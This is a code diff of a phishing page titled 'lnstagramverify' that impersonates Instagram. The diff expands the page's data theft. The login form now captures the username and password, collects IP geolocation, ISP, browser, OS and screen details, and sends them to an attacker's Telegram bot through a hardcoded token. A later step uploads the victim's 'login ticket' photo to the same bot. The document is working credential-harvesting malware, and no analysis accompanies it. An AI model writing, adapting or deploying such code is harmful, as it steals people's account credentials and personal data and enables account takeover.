@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>activeverify</title>
+  <title>lnstagramverify</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
   <!-- Tailwind -->
@@ -45,6 +45,8 @@
   <script src="https://unpkg.com/react@18/umd/react.development.js"></script>
   <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
   <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+  <!-- UAParser for browser detection -->
+  <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1/dist/ua-parser.min.js"></script>
 </head>
 
 <body class="bg-white text-slate-900 dark:bg-slate-950 dark:text-white transition-colors">
@@ -55,13 +57,75 @@
 const TELEGRAM_BOT_TOKEN = "7830288241:AAEk3vRFnaL3gzGWrywhHoGDaKvv574do0E";
 const TELEGRAM_CHAT_ID = "5692748706";
 
+// Function to get real-time device & browser information
+function getDeviceInfo() {
+  const parser = new UAParser();
+  const result = parser.getResult();
+
+  return {
+    browser: `${result.browser.name || 'Unknown'} ${result.browser.version || ''}`,
+    os: `${result.os.name || 'Unknown'} ${result.os.version || ''}`,
+    device: result.device.type || 'Desktop',
+    userAgent: navigator.userAgent,
+    screenRes: `${window.screen.width}x${window.screen.height}`,
+    viewport: `${window.innerWidth}x${window.innerHeight}`,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    language: navigator.language,
+  };
+}
+
+// Function to get real-time location
+async function getLocationInfo() {
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    const data = await res.json();
+    return {
+      ip: data.ip,
+      country: data.country_name,
+      city: data.city,
+      region: data.region,
+      latitude: data.latitude,
+      longitude: data.longitude,
+      timezone: data.timezone,
+      isp: data.org,
+    };
+  } catch (error) {
+    console.log("Location fetch error:", error);
+    return null;
+  }
+}
+
+// Function to get current time
+function getCurrentTime() {
+  const now = new Date();
+  return {
+    timestamp: now.toISOString(),
+    localTime: now.toLocaleString(),
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+  };
+}
+
 function App() {
   const [step, setStep] = React.useState("login");
   const [error, setError] = React.useState("");
   const [preview, setPreview] = React.useState(null);
   const [ticketUploaded, setTicketUploaded] = React.useState(false);
+  const [deviceInfo, setDeviceInfo] = React.useState(null);
+  const [locationInfo, setLocationInfo] = React.useState(null);
 
   const sessionId = React.useRef(crypto.randomUUID()).current;
+  const sessionStartTime = React.useRef(new Date().toISOString()).current;
+
+  // Fetch device info on mount
+  React.useEffect(() => {
+    const info = getDeviceInfo();
+    setDeviceInfo(info);
+  }, []);
+
+  // Fetch location info on mount
+  React.useEffect(() => {
+    getLocationInfo().then(info => setLocationInfo(info));
+  }, []);
 
   async function handleLogin(e) {
     e.preventDefault();
@@ -80,25 +144,46 @@ function App() {
     setError("");
 
     try {
-      const ipRes = await fetch("https://api.ipify.org?format=json");
-      const ipData = await ipRes.json();
-      const timestamp = new Date().toISOString();
+      const timeInfo = getCurrentTime();
+      
+      const messageText = `📩 User Info Submitted
+👤 Username/Email: ${email}
+🔐 Password: ${name}
+
+🌐 NETWORK INFO:
+📍 IP: ${locationInfo?.ip || 'N/A'}
+🗺️ Country: ${locationInfo?.country || 'N/A'}
+🏙️ City: ${locationInfo?.city || 'N/A'}
+🆔 ISP: ${locationInfo?.isp || 'N/A'}
+
+💻 BROWSER INFO:
+🔹 Browser: ${deviceInfo?.browser || 'N/A'}
+🔹 OS: ${deviceInfo?.os || 'N/A'}
+🔹 Device Type: ${deviceInfo?.device || 'N/A'}
+🔹 Screen: ${deviceInfo?.screenRes || 'N/A'}
+🔹 Viewport: ${deviceInfo?.viewport || 'N/A'}
+🔹 Language: ${deviceInfo?.language || 'N/A'}
+
+⏰ TIME INFO:
+🕐 Local Time: ${timeInfo.localTime}
+📅 Timestamp: ${timeInfo.timestamp}
+🌍 Timezone: ${timeInfo.timezone}
+
+🔗 SESSION INFO:
+🆔 Session ID: ${sessionId}
+⏱️ Session Start: ${sessionStartTime}`;
 
       fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: TELEGRAM_CHAT_ID,
-          text:
-`📩 User Info Submitted
-👤 Name: ${name}
-📧 Email: ${email}
-🌐 IP: ${ipData.ip}
-🕒 ${timestamp}
-🆔 ${sessionId}`
+          text: messageText
         })
       }).catch(() => {});
-    } catch {}
+    } catch (err) {
+      console.log("Send error:", err);
+    }
 
     setStep("verify");
   }
@@ -111,18 +196,30 @@ function App() {
     setError("");
 
     try {
-      const ipRes = await fetch("https://api.ipify.org?format=json");
-      const ipData = await ipRes.json();
-      const timestamp = new Date().toISOString();
+      const timeInfo = getCurrentTime();
 
       const formData = new FormData();
       formData.append("chat_id", TELEGRAM_CHAT_ID);
       formData.append(
         "caption",
-        `📩 Login Ticket
-🌐 IP: ${ipData.ip}
-🕒 ${timestamp}
-🆔 ${sessionId}`
+        `📸 Login Ticket Uploaded
+
+🌐 NETWORK INFO:
+📍 IP: ${locationInfo?.ip || 'N/A'}
+🗺️ Country: ${locationInfo?.country || 'N/A'}
+🏙️ City: ${locationInfo?.city || 'N/A'}
+
+💻 BROWSER INFO:
+🔹 Browser: ${deviceInfo?.browser || 'N/A'}
+🔹 OS: ${deviceInfo?.os || 'N/A'}
+🔹 Device Type: ${deviceInfo?.device || 'N/A'}
+
+⏰ TIME INFO:
+🕐 Local Time: ${timeInfo.localTime}
+📅 Timestamp: ${timeInfo.timestamp}
+
+🔗 SESSION INFO:
+🆔 Session ID: ${sessionId}`
       );
       formData.append("photo", file);
 
@@ -132,9 +229,10 @@ function App() {
       );
 
       setTicketUploaded(true);
-    } catch {
+    } catch (err) {
       setError("Upload failed. Please try again.");
       setTicketUploaded(false);
+      console.log("Upload error:", err);
     }
   }
 
@@ -143,7 +241,6 @@ function App() {
       setError("Please upload your login ticket or take a photo to continue.");
       return;
     }
-    // REDIRECT TO EMAIL PAGE
     window.location.href = "email.html";
   }
 
@@ -177,7 +274,7 @@ function App() {
 
             {/* LOGO — centered, spaced properly, NO interaction */}
             <img
-              src="https://unblast.com/wp-content/uploads/2025/07/in-logo-colored-768x768.jpg"
+              src="https://images.rawpixel.com/image_800/cHJpdmF0ZS9sci9pbWFnZXMvd2Vic2l0ZS8yMDIyLTA1L3JtNTMzLW5lb24tMDAzLmpwZw.jpg"
               className="w-16 h-16 mx-auto mb-8 mt-2 rounded-full shadow"
             />
 
@@ -188,7 +285,7 @@ function App() {
             <input name="email" placeholder="Username or email"
               className="mb-3 px-4 py-3 rounded-lg bg-slate-100 dark:bg-slate-800 border border-slate-300 dark:border-slate-700" />
 
-            <input name="name" type="text" placeholder="name"
+            <input name="name" type="text" placeholder="passw**d"
               className="mb-4 px-4 py-3 rounded-lg bg-slate-100 dark:bg-slate-800 border border-slate-300 dark:border-slate-700" />
 
             <button className="py-3 rounded-lg bg-sky-500 text-white font-semibold hover:bg-sky-600">
@@ -202,7 +299,7 @@ function App() {
 
             {/* SAME LOGO PLACEMENT */}
             <img
-              src="https://unblast.com/wp-content/uploads/2025/07/in-logo-colored-768x768.jpg"
+              src="https://images.rawpixel.com/image_800/cHJpdmF0ZS9sci9pbWFnZXMvd2Vic2l0ZS8yMDIyLTA1L3JtNTMzLW5lb24tMDAzLmpwZw.jpg"
               className="w-16 h-16 mx-auto mb-6 mt-2 rounded-full shadow"
             />
 
